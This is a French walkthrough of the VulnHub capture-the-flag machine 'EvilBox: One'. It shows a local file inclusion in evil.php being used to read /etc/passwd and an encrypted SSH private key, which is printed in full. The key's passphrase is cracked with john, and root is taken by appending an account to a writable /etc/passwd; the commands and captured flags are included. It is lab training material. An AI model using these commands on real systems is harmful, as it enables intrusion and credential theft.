---
title: "Solution du CTF EvilBox: One de VulnHub"
tags: [CTF,VulnHub]
---

[EvilBox: One](https://vulnhub.com/entry/evilbox-one,736/) était un CTF assez simple bien qu'il nécessite pas mal d'énumération initiale.

Nmap trouve tout de suite la présence d'un dossier nommé `secret` sous la racine web :

```
Nmap scan report for 192.168.56.209
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-enum: 
|   /robots.txt: Robots file
|_  /secret/: Potentially interesting folder
|_http-server-header: Apache/2.4.38 (Debian)
```

J'ai énuméré assez largement ce dossier avec différentes extensions :

```bash
feroxbuster -u http://192.168.56.209/secret/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -f -n -W 28 -x php,txt,zip,html,pdf
```

Il en est ressorti un script `evil.php` qui s'avère vide. Vraisemblablement, il attend qu'on lui passe un paramètre.

J'ai d'abord essayé de bruteforcer un nom de paramètre en passant la valeur `id` dans l'espoir d'avoir une exécution de commande, mais sans succès.

Finalement j'ai retenté en passant la valeur `/etc/passwd` comme sur le [CTF Insomnia]({% link _posts/2022-12-06-Solution-du-CTF-Insomnia-de-VulnHub.md %}) et cette fois ça a fonctionné :

```console
$ ffuf -u "http://192.168.56.209/secret/evil.php?FUZZ=/etc/passwd" -w wordlists/common_query_parameter_names.txt -fs 0
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.209/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: wordlists/common_query_parameter_names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27]
:: Progress: [5699/5699] :: Job [1/1] :: 3966 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

On obtient effectivement le fichier `passwd` et je note un nom d'utilisateur :

```
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

À tout hasard je tente de charger sa clé privée SSH et c'est le jackpot :

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

Vu qu'elle est protégée par une passphrase j'en extrais un hash avec `ssh2john.py` que je casse ensuite avec `JtR`.

```console
$ john --wordlist=wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
unicorn          (/tmp/id_rsa)     
1g 0:00:00:00 DONE (2023-05-18 21:27) 50.00g/s 62400p/s 62400c/s 62400C/s ramona..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Seulement l'authentification par clé ne semble pas acceptée, ssh demande directement un mot de passe pour le compte. `unicorn` n'est pas accepté.

J'ai converti directement la LFI en RCE à l'aide de [GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator).

Une fois un shell obtenu j'ai voulu mettre au clair cette histoire de clé SSH et il s'avère qu'en local tout fonctionne :

```console
www-data@EvilBoxOne:/home/mowree/.ssh$ ssh -i id_rsa mowree@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ id
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
mowree@EvilBoxOne:~$ cat user.txt 
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
```

Ne trouvant pas de fichiers particuliers pour `mowree` j'ai procédé à une énumération classique et en cherchant les fichiers de `root` que je peux modifier c'est une fois de plus le jackpot :

```console
mowree@EvilBoxOne:~$ find / -user root -writable -ls 2> /dev/null | grep -v /proc | grep -v /dev
   129803      4 drwxrwxrwt   9 root     root         4096 may 18 21:39 /tmp
   129824      4 drwxrwxrwt   2 root     root         4096 may 18 19:06 /tmp/.ICE-unix
   129818      4 drwxrwxrwt   2 root     root         4096 may 18 19:06 /tmp/.X11-unix
--- snip ---
     9949      0 drwxrwxrwt   4 root     root           80 may 18 19:06 /run/lock
   259743      4 -rw-rw-rw-   1 root     root         1398 ago 16  2021 /etc/passwd
   259840      4 drwxrwxrwt   4 root     root         4096 may 18 21:39 /var/tmp
   268084      4 drwx-wx-wt   2 root     root         4096 dic 17  2018 /var/lib/php/sessions
   259837      0 lrwxrwxrwx   1 root     root            9 ago 16  2021 /var/lock -> /run/lock
```

Le fichier `passwd` est modifiable, je vais donc me rajouter en compte `root` :

```console
mowree@EvilBoxOne:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
mowree@EvilBoxOne:~$ su devloop
Contraseña: 
# id
uid=0(root) gid=0(root) grupos=0(root)
# cd /root
# ls
root.txt
# cat root.txt  
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

